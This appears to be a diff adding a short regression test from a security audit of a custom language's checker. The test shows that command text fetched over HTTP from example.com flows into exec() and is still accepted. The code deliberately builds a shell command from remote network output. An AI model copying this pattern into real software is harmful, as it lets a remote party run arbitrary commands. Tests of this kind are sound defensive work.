@@ -1,0 +1,7 @@
+// №948 boundary pin B4 (audit PoC e02): network output steers exec
+// through a pattern — the model/remote output selects the command.
+// CURRENT behavior (v0.39.0): mlog check passes. Flip target: №950 —
+// the exec lane through the summary rules -> UNTRUSTED_EXEC_DECISION.
+pattern Sh(c: String) -> String { return exec(c) }
+pattern P(x: String) -> String { return Sh("ls " + http_get("https://example.com/cmd")) }
+flow Main { input: String = "x" -> P -> output }
